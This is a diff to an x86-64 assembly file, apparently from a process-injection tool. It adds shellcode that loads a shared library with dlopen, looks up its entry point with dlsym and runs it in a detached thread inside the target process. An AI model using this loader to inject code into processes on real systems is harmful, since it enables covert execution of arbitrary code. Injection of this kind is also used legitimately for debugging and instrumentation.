@@ -30,15 +30,96 @@
 .global shellcode_end
 
 .set __NR_exit, 60
+.set RTLD_LAZY, 1
 
 	.align 8
 shellcode_start:
 	/*
-	 * Invoke exit() and terminate the thread.
+	 * void *payload; // %rax
+	 *
+	 * payload = dlopen(shellcode_address_payload, RTLD_LAZY);
+	 */
+	lea	shellcode_address_payload(%rip),%rdi
+	mov	$RTLD_LAZY,%rsi
+	mov	shellcode_address_dlopen(%rip),%rax
+	callq	*%rax
+
+	/*
+	 * if (!payload) exit(1);
+	 */
+	test	%rax,%rax
+	jz	.Lerror_dlopen
+
+	/*
+	 * void (*entry)(void); // %rax
+	 *
+	 * entry = dlsym(payload, shellcode_address_entry);
+	 */
+	mov	%rax,%rdi
+	lea	shellcode_address_entry(%rip),%rsi
+	mov	shellcode_address_dlsym(%rip),%rax
+	callq	*%rax
+
+	/*
+	 * if (!entry) exit(2);
+	 */
+	test	%rax,%rax
+	jz	.Lerror_dlsym
+
+	/*
+	 * int err; // %rax
+	 * pthread_t thread; // 0(%rbp)
+	 *
+	 * err = pthread_create(&thread, NULL, entry, NULL);
+	 */
+	sub	$8,%rsp
+	mov	%rsp,%rdi
+	xor	%rsi,%rsi
+	mov	%rax,%rdx
+	xor	%rcx,%rcx
+	mov	shellcode_address_pthread_create(%rip),%rax
+	callq	*%rax
+
+	/*
+	 * if (err) exit(3);
+	 */
+	test	%rax,%rax
+	jnz	.Lerror_pthread_create
+
+	/*
+	 * err = pthread_detach(thread);
+	 */
+	mov	(%rsp),%rdi
+	add	$8,%rsp
+	mov	shellcode_address_pthread_detach(%rip),%rax
+	callq	*%rax
+
+	/*
+	 * if (err) exit(4);
+	 */
+	test	%rax,%rax
+	jnz	.Lerror_pthread_detach
+
+	/*
+	 * exit(0);
 	 */
 	xor	%rdi,%rdi
+.Lout:
 	mov	$__NR_exit,%rax
 	syscall
+
+.Lerror_dlopen:
+	mov	$1,%rdi
+	jmp	.Lout
+.Lerror_dlsym:
+	mov	$2,%rdi
+	jmp	.Lout
+.Lerror_pthread_create:
+	mov	$3,%rdi
+	jmp	.Lout
+.Lerror_pthread_detach:
+	mov	$4,%rdi
+	jmp	.Lout
 
 	.align 8
 shellcode_address_dlopen:
